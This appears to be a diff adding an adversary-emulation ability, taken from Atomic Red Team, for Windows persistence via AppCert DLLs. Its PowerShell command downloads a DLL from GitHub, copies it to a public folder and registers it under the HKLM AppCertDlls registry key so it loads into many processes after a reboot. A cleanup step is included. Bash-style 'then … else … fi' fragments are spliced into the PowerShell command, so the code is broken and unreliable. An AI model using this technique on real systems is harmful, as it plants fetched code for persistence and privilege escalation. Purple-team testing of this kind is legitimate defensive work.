@@ -1,0 +1,63 @@
+- id: a5ad6104-5bab-4c43-b295-b4c44c7c6b05
+  name: Create registry persistence via AppCert DLL
+  description: "Creates a new 'AtomicTest' value pointing to an AppCert DLL in the\
+    \ AppCertDlls registry key. \nOnce the computer restarted, the DLL will be loaded\
+    \ in multiple processes and write an \n'AtomicTest.txt' file in C:\\Users\\Public\\\
+    \ to validate that the DLL executed succesfully.\n\nReference: https://skanthak.homepage.t-online.de/appcert.html"
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1546.009
+    name: 'Event Triggered Execution: AppCert DLLs'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1546.009\bin\AtomicTest.dll")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
+          "PathToAtomicsFolder\T1546.009\bin\AtomicTest.dll") -ErrorAction ignore
+          | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.009/bin/AtomicTest.dll"
+          -OutFile "PathToAtomicsFolder\T1546.009\bin\AtomicTest.dll"; fi; Copy-Item
+          "PathToAtomicsFolder\T1546.009\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll
+          -Force; reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session
+          Manager\AppCertDlls" /v "AtomicTest" /t REG_EXPAND_SZ /d "C:\Users\Public\AtomicTest.dll"
+          /f; if($false){Restart-Computer}'
+        cleanup: reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session
+          Manager\AppCertDlls" /v "AtomicTest" /f; Remove-Item C:\Users\Public\AtomicTest.dll
+          -Force; Remove-Item C:\Users\Public\AtomicTest.txt -Force
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1546.009
+  - privilege-escalation
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      dll_path:
+        description: path of dll to use
+        type: path
+        default: PathToAtomicsFolder\T1546.009\bin\AtomicTest.dll
+      reboot:
+        description: Set value to $true if you want to automatically reboot the machine
+        type: string
+        default: $false
+    dependencies:
+    - description: 'File to copy must exist on disk at specified location (#{dll_path})
+
+        '
+      prereq_command: 'if (Test-Path "#{dll_path}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{dll_path}") -ErrorAction
+        ignore | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.009/bin/AtomicTest.dll"
+        -OutFile "#{dll_path}"
+
+        '
+    technique_created: '2020-01-24T14:47:41.795Z'
+    atomic_guid: a5ad6104-5bab-4c43-b295-b4c44c7c6b05
+    import_timestamp: '2025-06-24T11:15:02.303187Z'
